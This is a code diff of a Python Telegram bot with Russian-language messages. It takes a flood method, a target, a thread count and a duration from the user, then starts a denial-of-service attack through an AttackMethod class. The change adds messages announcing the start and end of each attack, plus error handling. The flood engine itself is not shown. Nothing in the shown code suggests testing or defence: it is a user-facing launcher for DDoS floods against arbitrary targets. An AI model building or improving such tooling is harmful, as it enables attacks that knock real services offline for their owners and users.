@@ -97,21 +97,24 @@ async def add_threads(message: types.Message, state: FSMContext):
     global threads
     threads = message.text
     await state.update_data(answer1=threads)
-    await message.answer('Закончили заполнение, идет подготовка!')
-    await message.answer(f'Метод: {method};\n'
-                         f'Цель: {target};\n'
-                         f'Кол-во потоков: {threads}\n'
-                         f'Время спама: {time}')
+    try:
+        await message.answer(f'⚠️Атака начата!⚠️\n\n'
+                             f'1️⃣  Метод: {method};\n'
+                             f'2️⃣  Цель: {target};\n'
+                             f'3️⃣  Кол-во потоков: {threads}\n'
+                             f'4️⃣  Время спама: {time}\n\n')
 
-    with AttackMethod(
-        duration=int(time), name=method, threads=int(threads), target=target
-    ) as Flood:
-        Flood.Start()
-    await state.finish()
+        with AttackMethod(
+            duration=int(time), name=method, threads=int(threads), target=target
+        ) as Flood:
+            Flood.Start()
+
+        await message.answer('✅Атака закончена!✅')
+        await state.finish()
+    except Exception:
+        await state.reset_state()
+        await message.answer('Ошибка!!!')
 
 
 if __name__ == "__main__":
-    # Run ddos attack
-
-
     executor.start_polling(dp, skip_updates=True)
